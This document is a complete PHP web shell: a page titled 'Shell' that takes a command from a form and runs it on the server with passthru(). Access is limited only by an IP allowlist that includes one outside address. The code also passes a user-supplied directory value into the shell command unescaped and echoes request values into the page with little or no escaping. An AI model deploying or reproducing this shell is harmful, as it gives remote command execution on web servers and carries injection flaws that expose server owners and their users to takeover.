<?php
define("MAX_OUTPUT_LENGHT", 20000);
?><html>
<head>
<title>Shell - <?php echo(str_replace('<','',$_POST['cmd']));?></title>
</head>
<body style="background-color: black; color: white; font-family: Consolas, Tahoma, Arial">
<pre style="background-color: black; color: white; font-family: Consolas, Tahoma, Arial">
<?php
if (!in_array(@$_SERVER['REMOTE_ADDR'], array('127.0.0.1', '::1', '190.244.46.99')))
{
die('You are not allowed to access this file. Check '.basename(__FILE__).' for more information.');
}
$unique = !empty($_POST['unique'])?$_POST['unique']:"bshelltmp_".md5(rand(1000).date("YmdHis"));
$tmp = is_writable(dirname(__FILE__))?dirname(__FILE__):sys_get_temp_dir(); // on cloud servers we prefer the NFS than a different /tmp/ for every submit.
$tmppwd = $tmp."/".$unique."_pwd.txt";
$tmpoutput = $tmp."/".$unique."_output.txt";
$pwd = !empty($_POST['pwd'])?$_POST['pwd']:getcwd();
if(!empty($_POST['cmd']))
{
$cmd = stripslashes($_POST['cmd']);
passthru('cd '.$pwd.' && echo "<hr/>">> '.$tmpoutput.' && echo '.$pwd.'$ '.escapeshellarg($cmd).' >> '.$tmpoutput.' && echo >> '.$tmpoutput.' && '.$cmd .' >> '.$tmpoutput.' 2>&1 && pwd > '.$tmppwd);
$newpwd = trim(file_get_contents($tmppwd)); //capture new Present (current) Working Directory just in case it changed
if($newpwd != "") $pwd = $newpwd; //if something failed, don't change directory
echo(file_get_contents($tmpoutput, false, NULL, filesize($tmpoutput)-MAX_OUTPUT_LENGHT));
unlink($tmppwd);
}
?>
</pre>
<p>
<form method="post">
<a href="#" onclick="var a=document.getElementById('cmd');a.value=''; a.focus();document.location.href='#bottom';" style="background-color: black; color: gray;">Reset</a>
<input type="hidden" name="nocache" value="<?php echo md5(rand(1000).date("YmdHis")); ?>">
<input type="hidden" name="unique" value="<?php echo $unique; ?>">
<input type="hidden" name="pwd" value="<?php echo $pwd; ?>">
<?php echo $pwd; ?>$
<input type="text" style="background-color: black; color: white; font-family: Consolas, Tahoma, Arial; border: none; padding: 0px; margin:0px; width: 80%; background-color: black; color: white;" name="cmd" id="cmd" value="<?php echo htmlentities(stripslashes($_POST['cmd'])) ?>">
<input type="submit" value="Run">
</form>
<br/>
<br/>
</p>
<script>
function keys(e) {
var code;
if (!e) var e = window.event;
if (e.keyCode) code = e.keyCode;
else if (e.which) code = e.which;
//var character = String.fromCharCode(code);
//alert('Character was '+ code +'(' + character +')');
if(code == 27){
this.value='';
};
};
var cmd = document.getElementById('cmd');
cmd.focus()
if(cmd.attachEvent){
//IE
cmd.attachEvent('keypress',keys);
} else if(cmd.addEventListener) {
cmd.addEventListener('keypress',keys,false);
}
document.location.href="#bottom";
</script>
<a name="#bottom"></a>
</body>
</html>